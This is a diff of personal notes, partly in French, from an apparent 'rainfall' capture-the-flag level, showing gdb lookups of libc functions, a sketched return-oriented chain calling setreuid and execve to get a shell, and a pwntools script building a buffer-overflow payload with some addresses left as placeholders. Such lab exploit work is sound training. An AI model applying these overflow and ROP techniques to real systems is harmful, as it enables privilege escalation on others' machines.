@@ -25,13 +25,38 @@ warning: 44	./nptl/pthread_kill.c: No such file or directory
 (gdb) 
 
 ********
-level06@rainfall:~$ python3 -c "
+a la place de gadget
+on doit faire comme level5
+$1 = {void (void)} 0x7ffff7cef030 <__GI_execve>
+(gdb) p exit
+$2 = {void (int)} 0x7ffff7c47ba0 <__GI_exit>
+(gdb) p setreuid
+$3 = {int (uid_t, uid_t)} 0x7ffff7d27370 <__setreuid>
+avec libc = 0x7ffff7c00000
+
+#######################
+pop rdi
+1023
+pop rsi
+1023
+0
+addrsetreuid
+
+pop rdi
+addrshell
+pop rsi
+0 * 2
+pop rdx 0 * 5
+addrexecve
+addrexit
+
+python3 -c "
 from pwn import *
 offset = 199
 gadget = 0x7ffff7cef5ce
 payload = b'A'*offset
-payload += p64(ICI AJOUTER)
+payload += p64(*********************)
 payload += b'B'*8
-payload += p64(gadget)
+payload += p64(#####################)
 open('/tmp/payload','wb').write(payload)
 "
